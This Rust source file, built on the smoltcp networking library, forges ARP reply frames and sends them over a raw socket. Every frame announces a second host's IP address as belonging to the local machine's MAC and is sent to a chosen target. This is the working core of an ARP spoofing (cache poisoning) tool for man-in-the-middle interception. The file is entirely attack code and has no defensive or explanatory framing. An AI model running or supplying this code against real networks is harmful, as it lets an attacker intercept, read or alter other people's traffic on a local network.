use crate::net::utils::*;
use smoltcp::phy::{Device, RawSocket, TxToken};
use smoltcp::time::Instant;

pub fn craft_frame(
    buffer: &mut [u8],
    target_a_ip: &[u8],
    target_a_mac: &[u8],
    target_b_ip: &[u8],
) -> Result<(), smoltcp::Error> {
    let local_mac = get_local_mac(get_iface_name().unwrap());

    // dest
    for (j, i) in (0..6).enumerate() {
        buffer[i] = target_a_mac[j];
    }

    // src
    for (j, i) in (6..12).enumerate() {
        buffer[i] = local_mac[j];
    }

    // type
    buffer[12] = 8;
    buffer[13] = 6;

    // hardware type
    buffer[14] = 0;
    buffer[15] = 1;

    // protocol type
    buffer[16] = 8;
    buffer[17] = 0;

    // hardware size
    buffer[18] = 6;

    // protocol size
    buffer[19] = 4;

    // opcode
    buffer[20] = 0;
    buffer[21] = 2;

    // sender MAC address
    for (j, i) in (22..28).enumerate() {
        buffer[i] = local_mac[j];
    }

    // sender IP address
    for (j, i) in (28..32).enumerate() {
        buffer[i] = target_b_ip[j];
    }

    // target_ip MAC address
    for (j, i) in (32..38).enumerate() {
        buffer[i] = target_a_mac[j];
    }

    // target_ip IP address
    for (j, i) in (38..42).enumerate() {
        buffer[i] = target_a_ip[j];
    }

    Ok(())
}

pub fn send(socket: &mut RawSocket, target_a_ip: &[u8], target_a_mac: &[u8], target_b_ip: &[u8]) {
    let tx = socket.transmit().unwrap();
    tx.consume(Instant::now(), 42, |buffer| {
        craft_frame(buffer, target_a_ip, target_a_mac, target_b_ip)
    })
    .unwrap();
}
